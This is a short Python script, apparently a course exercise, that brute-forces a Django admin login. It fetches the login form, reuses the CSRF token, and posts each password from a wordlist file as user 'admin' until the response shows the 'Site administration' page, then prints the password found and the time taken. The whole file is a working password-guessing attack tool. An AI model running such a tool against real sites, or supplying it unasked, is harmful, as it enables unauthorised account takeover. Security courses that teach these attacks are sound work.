import sys
import time
import requests
import bs4 as bs

def extract_token(response):
  soup = bs.BeautifulSoup(response.text, 'html.parser')
  for i in soup.form.find_all('input'):
    if i.get('name') == 'csrfmiddlewaretoken':
      return i.get('value')
  return None
  

def isloggedin(response):
  soup = bs.BeautifulSoup(response.text, 'html.parser')
  return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
  # generate an initial loading of the login form
  s = requests.Session()
  resp = s.get(f'{address}/admin/login/?next=/admin/')
  cstoken = extract_token(resp)
  # login attempt is something like
  for pw in candidates:
    resp = s.post(f'{address}/admin/login/?next=/admin/', data={'username': 'admin', 'password': pw, 'csrfmiddlewaretoken':cstoken})
    # print(f'pw: {pw} resp.status_code: {resp.status_code}')
    if isloggedin(resp):
      return pw
  return None

# http://localhost:8000 both page to open and POST target


def main(argv):
  address = sys.argv[1]
  fname = sys.argv[2]
  candidates = [p.strip() for p in open(fname)]
  start_time = time.monotonic_ns()
  result = test_password(address, candidates)
  passed_time = time.monotonic_ns() - start_time
  print(f'{result} (took {passed_time/1_000_000:.4f} ms)')


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
  if len(sys.argv) != 3:
    print('usage: python %s address filename' % sys.argv[0])
  else:
    main(sys.argv)
